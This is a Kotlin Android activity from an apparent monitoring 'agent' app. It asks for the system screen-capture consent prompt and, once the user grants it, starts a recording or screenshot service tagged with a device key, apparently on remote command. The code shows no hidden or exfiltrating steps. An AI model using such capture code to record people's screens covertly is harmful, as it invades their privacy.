package com.guard.agent.helpers.media

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import com.guard.agent.utils.Logger

class MediaProjectionActivity : AppCompatActivity() {

    companion object {
        const val TAG = "MediaProjectionAct"
        const val EXTRA_MODE = "mode"
        const val EXTRA_DURATION = "duration"
        const val EXTRA_DEVICE_KEY = "device_key"

        const val MODE_RECORD = "record"
        const val MODE_SCREENSHOT = "screenshot"

        private const val REQ_MEDIA_PROJECTION = 5001
    }

    private var mode: String = MODE_RECORD
    private var duration: Int = 30
    private var deviceKey: String = ""

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        mode = intent.getStringExtra(EXTRA_MODE) ?: MODE_RECORD
        duration = intent.getIntExtra(EXTRA_DURATION, 30)
        deviceKey = intent.getStringExtra(EXTRA_DEVICE_KEY) ?: ""

        requestConsent()
    }

    private fun requestConsent() {
        try {
            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            startActivityForResult(mpm.createScreenCaptureIntent(), REQ_MEDIA_PROJECTION)
        } catch (e: Exception) {
            Logger.e(TAG, "requestConsent failed", e)
            finish()
        }
    }

    @Deprecated("Deprecated in Java")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        if (requestCode == REQ_MEDIA_PROJECTION) {
            if (resultCode == Activity.RESULT_OK && data != null) {
                Logger.d(TAG, "Consent granted — starting service")

                when (mode) {
                    MODE_RECORD -> {
                        ScreenHelper.startCaptureService(
                            this, resultCode, data, duration, deviceKey
                        )
                    }
                    MODE_SCREENSHOT -> {
                        // Screenshot bhi ScreenCaptureService se, short duration
                        ScreenHelper.startCaptureService(
                            this, resultCode, data, 3, deviceKey
                        )
                    }
                }
            } else {
                Logger.w(TAG, "Consent denied")
            }
            finish()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        Logger.d(TAG, "Activity destroyed")
    }
}
